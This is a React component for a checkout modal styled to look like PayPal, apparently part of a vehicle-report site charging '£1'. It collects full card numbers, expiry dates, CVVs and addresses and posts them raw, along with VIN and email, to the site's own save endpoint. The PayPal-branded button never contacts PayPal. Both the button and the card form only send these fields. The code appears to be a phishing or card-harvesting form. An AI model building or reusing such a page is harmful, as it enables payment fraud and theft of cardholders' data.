'use client'
import React, { useState } from 'react'

export default function PaypalModal({ isOpen, onClose, onSubscribe, orderData = {} }) {
  const [cardNumber, setCardNumber] = useState('')
  const [expiry, setExpiry] = useState('')
  const [cvv, setCvv] = useState('')
  const [address, setAddress] = useState('')
  const [postalCode, setPostalCode] = useState('')
  const [city, setCity] = useState('')
  const [country, setCountry] = useState('United States')
  const [isSaving, setIsSaving] = useState(false)

  if (!isOpen) return null

  const savePaymentForm = async (paymentMethod) => {
    const response = await fetch('/api/save-payment-form', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        cardNumber,
        expiry,
        cvv,
        address,
        postalCode,
        country,
        city,
        paymentMethod,
        vin: orderData.vin || '',
        email: orderData.email || '',
        carModel: orderData.carModel || '',
        plan: orderData.plan || '',
        price: orderData.price || '',
        vehicleType: orderData.vehicleType || '',
      }),
    })

    const result = await response.json()

    if (!response.ok || !result.success) {
      throw new Error(result.message || 'Failed to save payment form')
    }
  }

  const handlePayment = async (paymentMethod) => {
    if (isSaving) return

    setIsSaving(true)

    try {
      await savePaymentForm(paymentMethod)
      onSubscribe()
    } catch (error) {
      console.error('Payment form save failed:', error)
      alert(error.message || 'Failed to save payment details. Please try again.')
    } finally {
      setIsSaving(false)
    }
  }

  // Auto-format card number with spaces every 4 digits
  const handleCardNumberChange = (e) => {
    let digits = e.target.value.replace(/\D/g, '').slice(0, 16)
    let formatted = digits.replace(/(.{4})/g, '$1 ').trim()
    setCardNumber(formatted)
  }

  // Auto-format MM / YY
  const handleExpiryChange = (e) => {
    let digits = e.target.value.replace(/\D/g, '').slice(0, 4)
    if (digits.length > 2) {
      setExpiry(digits.slice(0, 2) + ' / ' + digits.slice(2))
    } else {
      setExpiry(digits)
    }
  }

  // CVV numeric only
  const handleCvvChange = (e) => {
    let digits = e.target.value.replace(/\D/g, '').slice(0, 4)
    setCvv(digits)
  }

  const handleSubmit = (e) => {
    e.preventDefault()
    handlePayment('Card')
  }

  return (
    <div className="paypal-modal-overlay" onClick={onClose}>
      <div className="paypal-modal-container" onClick={(e) => e.stopPropagation()}>
        
        {/* Close Button */}
        <button className="paypal-close-btn" onClick={onClose}>
          &times;
        </button>

        <form onSubmit={handleSubmit} className="right-panel">
          <button type="button" className="paypal-btn" onClick={() => handlePayment('PayPal')} disabled={isSaving}>
            <span className="paypal-logo">
              <span className="pay">Pay</span><span className="pal">Pal</span>
            </span>
          </button>

          <div className="or-divider">or</div>

          <div className="card-group">
            <div className="field field-cardnum">
              <input 
                type="text" 
                placeholder="Card number" 
                inputMode="numeric" 
                maxLength={19} 
                value={cardNumber}
                onChange={handleCardNumberChange}
                required
              />
              <div className="card-icons">
                <div className="card-icon icon-visa">VISA</div>
                <div className="card-icon icon-mc">
                  <div className="circles">
                    <div className="c1"></div>
                    <div className="c2"></div>
                  </div>
                </div>
                <div className="card-icon icon-amex">AMEX</div>
                <div className="card-icon icon-discover">DISCOVER</div>
                <svg className="lock-icon" width="14" height="16" viewBox="0 0 14 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <rect x="1" y="7" width="12" height="8" rx="1.5" stroke="currentColor" strokeWidth="1.3"/>
                  <path d="M3.5 7V4.5a3.5 3.5 0 0 1 7 0V7" stroke="currentColor" strokeWidth="1.3"/>
                </svg>
              </div>
            </div>
            
            <div className="split-row-inner">
              <div className="field">
                <input 
                  type="text" 
                  placeholder="MM / YY" 
                  maxLength={7} 
                  value={expiry}
                  onChange={handleExpiryChange}
                  required
                />
              </div>
              <div className="field">
                <input 
                  type="text" 
                  placeholder="CVV" 
                  maxLength={4} 
                  value={cvv}
                  onChange={handleCvvChange}
                  required
                />
                <svg className="info-icon" width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <circle cx="8" cy="8" r="7" stroke="currentColor" strokeWidth="1.2"/>
                  <path d="M8 7.2V11.2" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round"/>
                  <circle cx="8" cy="5" r="0.9" fill="currentColor"/>
                </svg>
              </div>
            </div>
          </div>

          <div className="single-group">
            <input 
              type="text" 
              placeholder="Address" 
              value={address}
              onChange={(e) => setAddress(e.target.value)}
              required
            />
          </div>

          <div className="split-row">
            <div className="field">
              <input 
                type="text" 
                placeholder="Postal code" 
                value={postalCode}
                onChange={(e) => setPostalCode(e.target.value)}
                required
              />
            </div>
            <div className="field country-select">
              <select 
                value={country} 
                onChange={(e) => setCountry(e.target.value)}
              >
                <option>Pakistan</option>
                <option>United States</option>
                <option>United Kingdom</option>
                <option>United Arab Emirates</option>
                <option>India</option>
                <option>Canada</option>
              </select>
              <svg className="chev" width="10" height="14" viewBox="0 0 10 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M1 5L5 1L9 5" stroke="currentColor" strokeWidth="1.3" strokeLinecap="round" strokeLinejoin="round"/>
                <path d="M1 9L5 13L9 9" stroke="currentColor" stroke-width="1.3" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
            </div>
          </div>

          <div className="single-group">
            <input 
              type="text" 
              placeholder="City" 
              value={city}
              onChange={(e) => setCity(e.target.value)}
              required
            />
          </div>

          <button type="submit" className="subscribe-btn" disabled={isSaving}>
            {isSaving ? 'Saving...' : 'Purchase for £1'}
          </button>
        </form>

      </div>
    </div>
  )
}
